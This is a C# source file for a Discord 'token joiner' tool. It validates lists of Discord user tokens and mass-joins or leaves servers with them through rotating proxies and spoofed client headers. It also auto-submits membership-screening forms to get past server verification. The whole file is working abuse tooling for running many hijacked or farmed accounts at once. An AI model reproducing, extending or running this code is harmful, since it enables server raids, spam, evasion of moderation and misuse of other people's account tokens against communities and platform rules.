using System;
using System.Drawing;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Collections.Generic;
using System.Net;
using System.Linq;
using System.Security.Authentication;
using Leaf.xNet;
using Newtonsoft.Json;
using System.Net.Http;

namespace Itroublve_Joiner_v3
{
    public partial class TokenManager : Form
    {
        #region List & Driver
        public List<string> sad = new List<string>();
        public List<string> Tokens = new List<string>();
        public List<string> WorkingTokens = new List<string>();
        public bool flag = true;
        #endregion
        #region GUI
        public TokenManager()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;
            HeadLbl.Left = (ClientSize.Width - HeadLbl.Width) / 2;
            TokensRichTxt.DragDrop += new DragEventHandler(TokensRichTxt_DragDrop);
            TokensRichTxt.AllowDrop = true;
            ProxiesRichTxt.DragDrop += new DragEventHandler(ProxiesRichTxt_DragDrop);
            ProxiesRichTxt.AllowDrop = true;
            FormClosing += CloseBtn_Click;
            RainbowTimer.Start();
        }
        private void TknSettingsBtn_Click(object sender, EventArgs e)
        {
			var _TokenSettings = Application.OpenForms.OfType<TokenSettingsFrm>().FirstOrDefault();
            if (_TokenSettings == null)
            {
                _TokenSettings = new TokenSettingsFrm(TokensRichTxt.Text != null ? TokensRichTxt.Text : null);
            }
            _TokenSettings.ShowDialog();
        }

        private void frndBtn_Click(object sender, EventArgs e)
        {
            var _frndReq = Application.OpenForms.OfType<FriendOpt>().FirstOrDefault();
            if (_frndReq == null)
            {
                _frndReq = new FriendOpt(TokensRichTxt.Text != null ? TokensRichTxt.Text : null);
            }
            _frndReq.ShowDialog();
        }

        private void DelayBar_Scroll(object sender, EventArgs e)
        {
            DelayLbl.Text = DelayBar.Value.ToString() + "s";
        }
        #region TextBox Options
        private void TokensRichTxt_TextChanged(object sender, EventArgs e)
        {
            if (!flag) flag = true;
        }
        //private void TokensRichTxt_Leave(object sender, EventArgs e)
        //{
        //    if (flag)
        //    {
        //        foreach (Match match in Regex.Matches(TokensRichTxt.Text, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"))
        //        {
        //            richTextBox3.Text +=  match.Value + "\n";
        //        }
        //        TokensRichTxt.Clear(); TokensRichTxt.Text = richTextBox3.Text;
        //        richTextBox3.Clear();
        //        flag = false;
        //    }
        //}
        void TokensRichTxt_DragDrop(object sender, DragEventArgs e)
        {
            object filename = e.Data.GetData("FileDrop");
            if (filename != null)
            {
                var list = filename as string[];

                if (list != null && !string.IsNullOrWhiteSpace(list[0]))
                {
                    TokensRichTxt.Clear();
                    TokensRichTxt.LoadFile(list[0], RichTextBoxStreamType.PlainText);
                    foreach (Match match in Regex.Matches(TokensRichTxt.Text, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"))
                    {
                        richTextBox3.Text += match.Value + "\n";
                    }
                    TokensRichTxt.Clear(); TokensRichTxt.Text = richTextBox3.Text;
                }

            }
        }
        void ProxiesRichTxt_DragDrop(object sender, DragEventArgs e)
        {
            object filename = e.Data.GetData("FileDrop");
            if (filename != null)
            {
                var list = filename as string[];

                if (list != null && !string.IsNullOrWhiteSpace(list[0]))
                {
                    ProxiesRichTxt.Clear();
                    ProxiesRichTxt.LoadFile(list[0], RichTextBoxStreamType.PlainText);
                    foreach (Match match in Regex.Matches(ProxiesRichTxt.Text, @"\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b:\d{2,5}"))
                    {
                        richTextBox3.Text += match.Value + "\n";
                    }
                    ProxiesRichTxt.Clear(); ProxiesRichTxt.Text = richTextBox3.Text;
                }

            }
        }
        #endregion
        #region Timers
        private void RainbowTimer_Tick(object sender, EventArgs e)
        {
            Rainbow.RainbowEffect();
            RainbowPnlUp.BackColor = Color.FromArgb(Rainbow.A, Rainbow.R, Rainbow.G);
            RainbowPnlDown.BackColor = Color.FromArgb(Rainbow.A, Rainbow.R, Rainbow.G);
        }

        private void CountToken_Tick(object sender, EventArgs e)
        {
            int totalTokens = Regex.Matches(TokensRichTxt.Text, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}").Count;
            CurrentStatusLbl.Text = $"Working Tokens: {WorkingTokens.Count}/{totalTokens} || Current Token Count: {Tokens.Count}";
            CurrentStatusLbl.ForeColor = Color.Yellow;
            if (totalTokens == Tokens.Count)
            {
                TokensRichTxt.ReadOnly = false;
                ChkTknPrxBtn.Enabled = true;
                CurrentStatusLbl.Text = $"Valid Tokens: {WorkingTokens.Count}/{totalTokens}";
                CurrentStatusLbl.ForeColor = Color.Green;
                TokensRichTxt.Text = string.Join("\n", WorkingTokens);
                CountToken.Stop();
            }
        }
        #endregion
        #region Move Form
        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [System.Runtime.InteropServices.DllImport("user32.dll")]
        public static extern bool ReleaseCapture();

        private void HeadLbl_MouseMove(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }
        #endregion
        #region Close & Exit
        private void CloseBtn_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }
        #endregion
        #region Placeholder
        private void InviteTxtbox_Enter(object sender, EventArgs e)
        {
            if (InviteTxtbox.Text == "Enter Invite") InviteTxtbox.Text = string.Empty;
        }

        private void InviteTxtbox_Leave(object sender, EventArgs e)
        {
            if (InviteTxtbox.Text == string.Empty) InviteTxtbox.Text = "Enter Invite";
        }

        #endregion
        #endregion
        #region Leaver 
        private async void LeaveBtn_Click(object sender, EventArgs e)
        {
            while (CurrentStatusLbl.Text.Contains("Working Tokens: ")|| CurrentStatusLbl.Text.Contains("Joining")) ;
            if (InviteTxtbox.Text == "Enter Invite") CurrentStatusLbl.Text = "No Valid Invite";
            foreach (Match tkn in Regex.Matches(TokensRichTxt.Text, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"))
            await Task.Run(() => LeaveAsync(tkn.Value)).ConfigureAwait(false);
        }
        public async void LeaveAsync(string Token)
        {
            var r = new HttpRequest();
            r.Get($"https://discord.com/api/v9/invites/{InviteTxtbox.Text}");
            dynamic info = JsonConvert.DeserializeObject(r.Response.ToString());
            string guildId = info.guild.id.ToString();
            try
            {
                r.KeepTemporaryHeadersOnRedirect = false;
                r.ClearAllHeaders();
                r.EnableMiddleHeaders = false;
                r.AllowEmptyHeaderValues = false;
                r.AddHeader("Accept", "*/*");
                r.AddHeader("Accept-Encoding", "gzip, deflate, br");
                r.AddHeader("Accept-Language", "en-US");
                r.AddHeader("Authorization", Token);
                r.AddHeader("Connection", "keep-alive");
                r.AddHeader("Cookie", $"__cfduid={TokenSettings.RandomCookie(43)}; __dcfduid={TokenSettings.RandomCookie(32)}; locale=en-US");
                r.AddHeader("DNT", "1");
                r.AddHeader("origin", "https://discord.com");
                r.AddHeader("Referer", "https://discord.com/channels/@me");
                r.AddHeader("TE", "Trailers");
                r.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36");
                r.AddHeader("X-Super-Properties", "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9");
                r.SslProtocols = SslProtocols.Tls12;
                if (!string.IsNullOrEmpty(ProxiesRichTxt.Text))
                {
                    var proxies = ProxiesRichTxt.Text.Split(new string[] { "\n" }, StringSplitOptions.RemoveEmptyEntries);
                    string proxy = proxies[new Random().Next(0, Regex.Matches(ProxiesRichTxt.Text, @"\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b:\d{2,5}").Count)];
                    r.Proxy = HttpProxyClient.Parse(proxy);
                }
                r.Delete($"https://discordapp.com/api/v9/users/@me/guilds/{guildId}");
            }
            catch{}
        }
        #endregion
        #region Joiner 
        private async void JoinBtn_Click(object sender, EventArgs e)
        {
            while (CurrentStatusLbl.Text.Contains("Working Tokens: ")) ;
            if (InviteTxtbox.Text == "Enter Invite") CurrentStatusLbl.Text = "No Valid Invite";
            await Task.Run(() => JoinBtnClicked()).ConfigureAwait(false);
        }

        public async Task JoinBtnClicked()
        {
            JoinBtn.Enabled = false;
            TokensRichTxt.ReadOnly = true;
            if (Regex.Match(TokensRichTxt.Text, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}").Success)
            {
                string invite = InviteTxtbox.Text;
                invite = invite.Replace("discord.gg/", "");
                invite = invite.Replace("discord.com/", "");
                invite = invite.Replace("https://", "");
                invite = invite.Replace("http://", "");
                invite = invite.Replace("api", "");
                invite = invite.Replace("v9/invites/", "");
                invite = invite.Replace("v8/invites/", "");
                invite = invite.Replace("v7/invites/", "");
                invite = invite.Replace("/invites/", "");
                invite = invite.Replace("v6/invites/", "");
                invite = invite.Replace("/", "");
                if (!string.IsNullOrEmpty(ProxiesRichTxt.Text))
                {
                    CurrentStatusLbl.Text = "Joining [Proxied]";
                    CurrentStatusLbl.ForeColor = Color.Yellow;
                    foreach (Match m in Regex.Matches(TokensRichTxt.Text, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"))
                    {
                        await Task.Run(() => JoinServer(m.Value, invite, true));
                    }
                }
                else
                {
                    CurrentStatusLbl.Text = "Joining";
                    CurrentStatusLbl.ForeColor = Color.Yellow;
                    foreach (Match m in Regex.Matches(TokensRichTxt.Text, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"))
                    {
                        await Task.Run(() => JoinServer(m.Value, invite, false));
                    }
                }
            }
            if (CurrentStatusLbl.Text == "Joining" || CurrentStatusLbl.Text == "Joining [Proxied]")
            {
                CurrentStatusLbl.Text = "Successfully Joined";
                CurrentStatusLbl.ForeColor = Color.Green;
            }
            else
            {
                CurrentStatusLbl.Text = "No Tokens";
                CurrentStatusLbl.ForeColor = Color.Red;
            }
            JoinBtn.Enabled = true;
            TokensRichTxt.ReadOnly = false;
        }

        public async void JoinServer(string Token, string invite, bool proxied)
        {
            await Task.Delay(DelayBar.Value * 1000).ConfigureAwait(false);
            try
            {
                HttpRequest r = new HttpRequest();
                r.KeepTemporaryHeadersOnRedirect = false;
                r.ClearAllHeaders();
                r.EnableMiddleHeaders = false;
                r.AllowEmptyHeaderValues = false;
                r.AddHeader("Accept", "*/*");
                r.AddHeader("Accept-Encoding", "gzip, deflate, br");
                r.AddHeader("Accept-Language", "en-US");
                r.AddHeader("Authorization", Token);
                r.AddHeader("Connection", "keep-alive");
                r.AddHeader("Cookie", $"__cfduid={TokenSettings.RandomCookie(43)}; __dcfduid={TokenSettings.RandomCookie(32)}; locale=en-US");
                r.AddHeader("DNT", "1");
                r.AddHeader("origin", "https://discord.com");
                r.AddHeader("Referer", "https://discord.com/channels/@me");
                r.AddHeader("TE", "Trailers");
                r.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36");
                r.AddHeader("X-Super-Properties", "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9");
                r.SslProtocols = SslProtocols.Tls12;
                if (proxied)
                {
                    var proxies = ProxiesRichTxt.Text.Split(new string[] { "\n" }, StringSplitOptions.RemoveEmptyEntries);
                    string proxy = proxies[new Random().Next(0, Regex.Matches(ProxiesRichTxt.Text, @"\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b:\d{2,5}").Count)];
                    r.Proxy = HttpProxyClient.Parse(proxy);
                }
                r.Post("https://discord.com/api/v9/invites/" + invite);
                if (ServerVerificationChkbox.Checked)
                {
                    var request = new HttpClient();
                    request.DefaultRequestHeaders.TryAddWithoutValidation("Authorization", Token);
                    try
                    {
                        r.Get($"https://discord.com/api/v9/invites/{invite}");
                        dynamic info = JsonConvert.DeserializeObject(r.Response.ToString());
                        string guildId = info.guild.id.ToString();
                        await Task.Delay(500);
                        var response = await request.GetAsync($"https://discord.com/api/v9/guilds/{guildId}/member-verification?with_guild=false");
                        dynamic form = JsonConvert.DeserializeObject(response.Content.ReadAsStringAsync().Result);
                        string msg = form.form_fields.ToString();
                        msg = msg.Replace("\n", "").Replace("\r", "");
                        msg = msg.Replace("}]", "");
                        string date = response.Content.ReadAsStringAsync().Result.Substring(13, 32);
                        var bypass = new HttpRequest();
                        bypass.AddHeader("Authorization", Token);
                        bypass.Put($"https://discord.com/api/v9/guilds/{guildId}/requests/@me", $"{{\"version\":\"{date}\",\"form_fields\":{msg},\"response\":true}}]}}", "application/json");
                    }
                    catch { }
                }
            }
            catch
            {
            }
        }
        #endregion
        #region Token Checker
        private async void ChkTknPrx_Click(object sender, EventArgs e)
        {
            ChkTknPrxBtn.Enabled = false;
            TokensRichTxt.ReadOnly = true;
            CountToken.Start();
            WorkingTokens.Clear();
            Tokens.Clear();
            foreach (Match token in Regex.Matches(TokensRichTxt.Text, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"))
            {
                await Task.Run(() => Checker(token.Value)).ConfigureAwait(false);
            }
        }
        public async Task Checker(string Token)
        {
            Parallel.ForEach(Regex.Matches(Token, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}").Cast<Match>(), async (token, state) => 
            {
                var wc = new WebClient();
                wc.Headers.Add("Content-Type", "application/json");
                wc.Headers.Add(HttpRequestHeader.Authorization, Token);
                try
                {
                    wc.DownloadString("https://discordapp.com/api/v9/users/@me/guilds");
                    WorkingTokens.Add(Token);
                }
                catch (Exception x)
                {
                    if (!x.Message.Contains("401") & !x.Message.Contains("403"))
                    {
                        try
                        {
                            wc.DownloadString("https://discordapp.com/api/v8/users/@me/guilds");
                            WorkingTokens.Add(Token);
                        }
                        catch
                        {
                        }
                    }
                }
                Tokens.Add(Token);
                wc?.Dispose();
                state.Break();
            });
        }
        #endregion
    }
}